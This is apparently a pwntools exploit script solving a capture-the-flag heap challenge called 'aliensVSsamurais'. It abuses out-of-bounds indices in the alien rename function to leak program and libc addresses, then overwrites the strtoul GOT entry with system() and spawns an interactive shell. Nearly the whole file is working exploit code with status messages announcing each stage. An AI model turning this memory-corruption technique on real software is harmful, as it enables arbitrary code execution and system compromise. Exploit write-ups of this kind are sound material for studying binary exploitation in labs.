#!/usr/bin/env python
import pwn
import re

p = pwn.process(['./aliensVSsamurais'])
pwn.context.terminal = ['tmux', 'splitw', '-h', '-p', '75']

la2tosys = -0x1b2550

def create_samurai(name, sen = 0):
    p.recvuntil("ka?")
    p.sendline("1")
    p.recvuntil("name?")
    if sen == 0:
        p.sendline(name)
    else:
        p.send(name)
    return

def delete_samurai(index):
    p.recvuntil("ka?")
    p.sendline("2")
    p.recvuntil("daimyo?")
    p.sendline(str(index))
    return

def hatchery():
    p.recvuntil("ka?")
    p.sendline("3")
    return

def create_alien(nsize, name, sen = 0):
    p.recvuntil("today.")
    p.sendline("1")
    p.recvuntil("name?")
    p.sendline(str(nsize))
    p.recvuntil("name?")
    if sen == 0:
        p.sendline(name)
    else:
        p.send(name)
    return

def delete_alien(index):
    p.recvuntil("today.")
    p.sendline("2")
    p.recvuntil("mother?")
    p.sendline(str(index))
    return

def rename_alien(index, name, sen = 0, ret = 1):
    p.recvuntil("today.")
    p.sendline("3")
    p.recvuntil("rename?")
    p.sendline(str(index))
    r = p.recvuntil("to?")
    if sen == 0:
        p.sendline(name)
    else:
        p.send(name)
    if ret == 1:
        return r
    else:
        return None

def invasion():
    p.recvuntil("today.")
    p.sendline("4")
    return


create_samurai("AAAA")
create_samurai("AAAA")
create_samurai("AAAA")
create_samurai("AAAA")
delete_samurai(0)
delete_samurai(1)

hatchery()

create_alien(0x28, "/bin/sh\x00")
create_alien(0x28, "BBBB")
create_alien(0x28, "/bin/sh\x00")

p.sendline("3")
p.recvuntil("rename?")
p.sendline(str(-10))
r = p.recvuntil("to?")
r = re.search("rename.*",r).group(0)[7:-4]
la = pwn.util.packing.unpack(r.ljust(8,"\x00"),'all', endian = 'little', signed = False)
print "Address inside readwrite section: "+hex(la)
p.send(pwn.p64(la))

a1 = la + 0x6a8
rename_alien(0x192,pwn.p64(a1),1)
rename_alien(0x193,pwn.p64(la-0x60),1)

p.sendline("3")
p.recvuntil("rename?")
p.sendline(str(0xca))
r = p.recvuntil("to?")
r = re.search("rename.*",r).group(0)[7:-4]
la2 = pwn.util.packing.unpack(r.ljust(8,"\x00"),'all', endian = 'little', signed = False)
print "[+] Address inside libc: "+hex(la2)
p.send(pwn.p64(la2))
sys = la2 + la2tosys
print "[+] System is at: "+hex(sys)
print "[+] Overwriting _strtoul in got.plt with address of system."

rename_alien(0x192,pwn.p64(a1),1)
rename_alien(0x193,pwn.p64(la+0x40),1)
rename_alien(0xca, pwn.p64(0x7),1)

rename_alien(0x192,pwn.p64(a1),1)
rename_alien(0x193,pwn.p64(la-0x18),1)
rename_alien(0xca, pwn.p64(sys),1)

p.recvuntil("today.")
p.sendline("/bin/sh")

print "[+] Shell spawned."
print "[!] _exit() is mangled, use kill [PID] to exit."

p.interactive()
